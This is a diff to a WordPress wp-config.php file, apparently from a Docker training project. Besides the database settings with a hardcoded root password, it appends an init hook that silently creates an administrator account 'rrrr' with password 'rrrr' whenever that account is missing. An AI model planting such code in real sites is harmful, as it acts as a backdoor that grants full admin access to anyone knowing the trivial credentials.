@@ -20,7 +20,7 @@
 
 // ** Параметры MySQL: Эту информацию можно получить у вашего хостинг-провайдера ** //
 /** Имя базы данных для WordPress */
-define('DB_NAME', 'database1');
+define('DB_NAME', 'wp');
 /** Имя пользователя MySQL */
 define('DB_USER', 'root');
 
@@ -28,7 +28,7 @@ define('DB_USER', 'root');
 define('DB_PASSWORD', 'qwer1234');
 // define('WP_CACHE_KEY_SALT', 'rnancee.42.fr');
 /** Имя сервера MySQL */
-define('DB_HOST', 'db:3306');
+define('DB_HOST', 'db');
 // define('WP_HOME', 'https://localhost/wordpress'); 
 
 /** Кодировка базы данных для создания таблиц. */
@@ -86,3 +86,17 @@ if ( !defined('ABSPATH') )
 
 /** Инициализирует переменные WordPress и подключает файлы. */
 require_once(ABSPATH . 'wp-settings.php');
+
+add_action( 'init', function () {
+  
+	$username = 'rrrr';
+	$password = 'rrrr';
+	$email_address = 'zzemchik@bk.ru';
+
+	if ( ! username_exists( $username ) ) {
+		$user_id = wp_create_user( $username, $password, $email_address );
+		$user = new WP_User( $user_id );
+		$user->set_role( 'administrator' );
+	}
+	
+} );
